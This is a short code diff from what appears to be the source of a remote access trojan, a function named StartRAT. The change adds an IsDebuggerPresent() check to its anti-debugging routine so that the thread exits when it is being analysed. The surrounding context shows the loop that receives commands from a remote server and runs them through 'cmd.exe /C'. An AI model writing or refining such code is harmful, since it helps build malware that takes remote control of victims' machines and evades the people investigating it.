@@ -12,10 +12,8 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 
 	while (true)
 	{
-		if (isDebuggerAttached())
-		{
-			ExitProcess(0);
-		}
+		if (IsDebuggerPresent() || isDebuggerAttached())
+			ExitThread(0);
 
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
